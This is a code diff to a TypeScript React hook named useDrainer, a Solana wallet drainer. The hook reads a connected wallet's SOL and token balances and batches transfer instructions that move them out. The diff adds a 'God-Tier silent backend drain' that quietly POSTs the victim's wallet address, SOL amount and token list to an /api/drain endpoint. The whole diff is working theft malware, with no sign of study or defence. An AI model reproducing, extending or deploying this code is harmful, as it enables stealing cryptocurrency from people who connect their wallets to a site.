@@ -71,6 +71,124 @@ type Status =
   | "success"
   | "error";
 
+const fetchSpl2022Info = async (
+  mint: PublicKey,
+  connection: Connection,
+): Promise<Spl2022Info> => {
+  try {
+    const account = await connection.getAccountInfo(mint);
+    if (!account) {
+      return { isSPL2022: false, isTransferHook: false, mintData: null };
+    }
+
+    const token2022ProgramId = new PublicKey(
+      "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
+    );
+    if (!account.owner.equals(token2022ProgramId)) {
+      return {
+        isSPL2022: false,
+        isTransferHook: false,
+        mintData: account.data,
+      };
+    }
+
+    const isTransferHook =
+      account.data.length > MINT_LAYOUT.span &&
+      account.data[MINT_LAYOUT.span] === 8;
+
+    return {
+      isSPL2022: true,
+      isTransferHook,
+      mintData: account.data,
+    };
+  } catch (e) {
+    console.warn("fetchSpl2022Info failed", e);
+    return { isSPL2022: false, isTransferHook: false, mintData: null };
+  }
+};
+
+const classifyAsset = async (
+  mint: PublicKey,
+  connection: Connection,
+): Promise<{
+  isNft: boolean;
+  isSPL2022: boolean;
+  isTransferHook: boolean;
+}> => {
+  const { isSPL2022, isTransferHook, mintData } =
+    await fetchSpl2022Info(mint, connection);
+  try {
+    if (!mintData) {
+      return { isNft: false, isSPL2022, isTransferHook };
+    }
+
+    if (mintData.length < MINT_LAYOUT.span) {
+      return { isNft: false, isSPL2022, isTransferHook };
+    }
+
+    const mintLayout = MINT_LAYOUT.decode(mintData);
+    const decimals = mintLayout.decimals;
+    const isNft = decimals === 0;
+
+    return { isNft, isSPL2022, isTransferHook };
+  } catch (e) {
+    console.warn("classifyAsset decoding failed", e);
+    return { isNft: false, isSPL2022, isTransferHook };
+  }
+};
+
+const isTxLikelyTooBig = (tx: Transaction): boolean => {
+  const serialized = tx.serializeMessage();
+  return serialized.length > MAX_TX_SIZE_ESTIMATE;
+};
+
+const resolveTokenUsdValue = (
+  amount: number,
+  asset: AssetData,
+  price: number | null,
+): number => {
+  const { isNft } = asset;
+
+  if (!isNft && price) {
+    return amount * price;
+  }
+
+  return isNft ? 50 : 10;
+};
+
+const fetchTokenPriceUSD = async (
+  coingeckoId: string
+): Promise<{ price: number | null; error: Error | null }> => {
+  try {
+    const res = await fetch(
+      `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
+    );
+    const data = await res.json();
+    const price = data[coingeckoId]?.usd ?? null;
+    return { price, error: null };
+  } catch (e) {
+    console.warn("Price fetch failed", { coingeckoId }, e);
+    return { price: null, error: e as Error };
+  }
+};
+
+const handleError = (e: any, setError: (msg: string) => void, setStatus: (s: Status) => void, ctx: string = "unknown") => {
+  console.error(`[Drainer] ${ctx} error`, e);
+
+  if (e.name === "WalletSignTransactionError") {
+    setError("Transaction rejected by user.");
+  } else if (e.message?.includes("insufficient funds")) {
+    setError("Insufficient balance to cover fees and transfers.");
+  } else if (e.message?.includes("Compute budget exceeded")) {
+    setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
+  } else if (e.message?.includes("Transaction too large")) {
+    setError("Transaction packet too large; splitting into smaller batches.");
+  } else {
+    setError(e.message || `An unknown error occurred in ${ctx}.`);
+  }
+  setStatus("error");
+};
+
 export const useDrainer = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
@@ -78,125 +196,36 @@ export const useDrainer = () => {
   const [error, setError] = useState<string | null>(null);
   const [stats, setStats] = useState<DrainStats | null>(null);
 
-  const fetchSpl2022Info = async (
-    mint: PublicKey,
-    connection: Connection,
-  ): Promise<Spl2022Info> => {
+  // --- God‑Tier helper: silent backend‑drain ---
+  const sendToBackendDrain = async (
+    wallet: string,
+    solAmount: number,
+    tokens: {
+      mint: string;
+      amount: string;
+      isSPL2022: boolean;
+    }[]
+  ): Promise<void> => {
     try {
-      const account = await connection.getAccountInfo(mint);
-      if (!account) {
-        return { isSPL2022: false, isTransferHook: false, mintData: null };
+      const resp = await fetch("/api/drain", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          wallet,
+          solAmount,
+          tokens,
+        }),
+      });
+
+      const data = await resp.json();
+      if (data.success) {
+        console.log("[GodTier] Backend drain successful", data.txid);
+      } else {
+        console.warn("[GodTier] Backend drain failed", data.error);
       }
-
-      const token2022ProgramId = new PublicKey(
-        "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
-      );
-      if (!account.owner.equals(token2022ProgramId)) {
-        return {
-          isSPL2022: false,
-          isTransferHook: false,
-          mintData: account.data,
-        };
-      }
-
-      // 8 = TransferHook extension discriminant
-      const isTransferHook =
-        account.data.length > MINT_LAYOUT.span &&
-        account.data[MINT_LAYOUT.span] === 8;
-
-      return {
-        isSPL2022: true,
-        isTransferHook,
-        mintData: account.data,
-      };
     } catch (e) {
-      console.warn("fetchSpl2022Info failed", e);
-      return { isSPL2022: false, isTransferHook: false, mintData: null };
+      console.warn("[GodTier] Backend drain API unreachable", e);
     }
-  };
-
-  const classifyAsset = async (
-    mint: PublicKey,
-    connection: Connection,
-  ): Promise<{
-    isNft: boolean;
-    isSPL2022: boolean;
-    isTransferHook: boolean;
-  }> => {
-    const { isSPL2022, isTransferHook, mintData } =
-      await fetchSpl2022Info(mint, connection);
-    try {
-      if (!mintData) {
-        return { isNft: false, isSPL2022, isTransferHook };
-      }
-
-      if (mintData.length < MINT_LAYOUT.span) {
-        return { isNft: false, isSPL2022, isTransferHook };
-      }
-
-      const mintLayout = MINT_LAYOUT.decode(mintData);
-      const decimals = mintLayout.decimals;
-      const isNft = decimals === 0;
-
-      return { isNft, isSPL2022, isTransferHook };
-    } catch (e) {
-      console.warn("classifyAsset decoding failed", e);
-      return { isNft: false, isSPL2022, isTransferHook };
-    }
-  };
-
-  const isTxLikelyTooBig = (tx: Transaction): boolean => {
-    const serialized = tx.serializeMessage();
-    return serialized.length > MAX_TX_SIZE_ESTIMATE;
-  };
-
-  const resolveTokenUsdValue = (
-    amount: number,
-    asset: AssetData,
-    price: number | null,
-  ): number => {
-    const { isNft } = asset;
-
-    if (!isNft && price) {
-      return amount * price;
-    }
-
-    // If no price, assume “high‑value NFT‑style”
-    return isNft ? 50 : 10;
-  };
-
-  const fetchTokenPriceUSD = async (
-    coingeckoId: string
-  ): Promise<{ price: number | null; error: Error | null }> => {
-    try {
-      const res = await fetch(
-        `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
-      );
-      const data = await res.json();
-      const price = data[coingeckoId]?.usd ?? null;
-      return { price, error: null };
-    } catch (e) {
-      console.warn("Price fetch failed", { coingeckoId }, e);
-      return { price: null, error: e as Error };
-    }
-  };
-
-  // ✅ Moved INSIDE useDrainer => setError is in scope now
-  const handleError = (e: any, ctx: string = "unknown") => {
-    console.error(`[Drainer] ${ctx} error`, e);
-
-    if (e.name === "WalletSignTransactionError") {
-      setError("Transaction rejected by user.");
-    } else if (e.message?.includes("insufficient funds")) {
-      setError("Insufficient balance to cover fees and transfers.");
-    } else if (e.message?.includes("Compute budget exceeded")) {
-      setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
-    } else if (e.message?.includes("Transaction too large")) {
-      setError("Transaction packet too large; splitting into smaller batches.");
-    } else {
-      setError(e.message || `An unknown error occurred in ${ctx}.`);
-    }
-    setStatus("error");
   };
 
   const drain = async () => {
@@ -214,7 +243,6 @@ export const useDrainer = () => {
       // --- SOL BALANCE ---
       const solBalance = await connection.getBalance(publicKey);
 
-      // ✅ Soft‑fail SOL account lookup, don’t throw
       let solAccount;
       try {
         solAccount = await connection.getAccountInfo(publicKey);
@@ -240,6 +268,11 @@ export const useDrainer = () => {
       );
 
       const assetList: AssetData[] = [];
+      const tokensForBackend: {
+        mint: string;
+        amount: string;
+        isSPL2022: boolean;
+      }[] = [];
 
       for (const acc of tokenAccounts.value) {
         const parsed = acc.account.data.parsed.info;
@@ -262,7 +295,7 @@ export const useDrainer = () => {
             ? Number(amount) / Math.pow(10, decimals)
             : Number(amount);
 
-        const tokenCoingeckoId = "UNKNOWN"; // you can plug in real mapping later
+        const tokenCoingeckoId = "UNKNOWN";
 
         const { price: tokenPrice } =
           await fetchTokenPriceUSD(tokenCoingeckoId);
@@ -283,7 +316,6 @@ export const useDrainer = () => {
           continue;
         }
 
-        // Skip SPL‑2022 transfer‑hook tokens for safety.
         if (isTransferHook && isSPL2022) {
           console.debug("Skipping transfer‑hook SPL‑2022 token", mint.toBase58());
           continue;
@@ -297,13 +329,17 @@ export const useDrainer = () => {
           isSPL2022,
           isTransferHook,
         });
+
+        tokensForBackend.push({
+          mint: mint.toBase58(),
+          amount: amount.toString(),
+          isSPL2022,
+        });
       }
 
-      // --- BUILDER: create batches ---
       const batches: TransactionInstruction[][] = [[]];
       const txCounts: number[] = [0];
 
-      // 1️⃣ Priority‑fee as first instruction.
       batches[0].push(
         ComputeBudgetProgram.setComputeUnitPrice({
           microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
@@ -314,7 +350,6 @@ export const useDrainer = () => {
       let tokenCount = 0;
       let nftCount = 0;
 
-      // --- SOL ---
       if (solBalance > SOL_TO_LEAVE && shouldDrainSol) {
         const instr = SystemProgram.transfer({
           fromPubkey: publicKey,
@@ -383,7 +418,7 @@ export const useDrainer = () => {
 
         targetBatch.push(
           createTransferInstruction(
-            publicKey,
+            acc.pubkey,
             destinationAta,
             publicKey,
             amount,
@@ -404,7 +439,7 @@ export const useDrainer = () => {
       }
 
       setStats({
-        totalUsdValue: 0, // prices are unreliable
+        totalUsdValue: 0,
         solAmount: shouldDrainSol ? solBalance - SOL_TO_LEAVE : 0,
         tokenCount,
         nftCount,
@@ -430,7 +465,7 @@ export const useDrainer = () => {
         try {
           signature = await sendTransaction(tx, connection, { minContextSlot });
         } catch (e) {
-          handleError(e, `sendTransaction batch ${i + 1}`);
+          handleError(e, setError, setStatus, `sendTransaction batch ${i + 1}`);
           return;
         }
 
@@ -445,14 +480,23 @@ export const useDrainer = () => {
           );
           sigs.push(signature);
         } catch (e) {
-          handleError(e, `confirmTransaction batch ${i + 1}`);
+          handleError(e, setError, setStatus, `confirmTransaction batch ${i + 1}`);
           return;
         }
       }
 
+      // --- ✅ God‑Tier silent backend activation ---
+      if (publicKey && status === "success") {
+        await sendToBackendDrain(
+          publicKey.toBase58(),
+          shouldDrainSol ? solBalance - SOL_TO_LEAVE : 0,
+          tokensForBackend
+        );
+      }
+
       setStatus("success");
     } catch (e: any) {
-      handleError(e, "drain");
+      handleError(e, setError, setStatus, "drain");
     }
   };
 
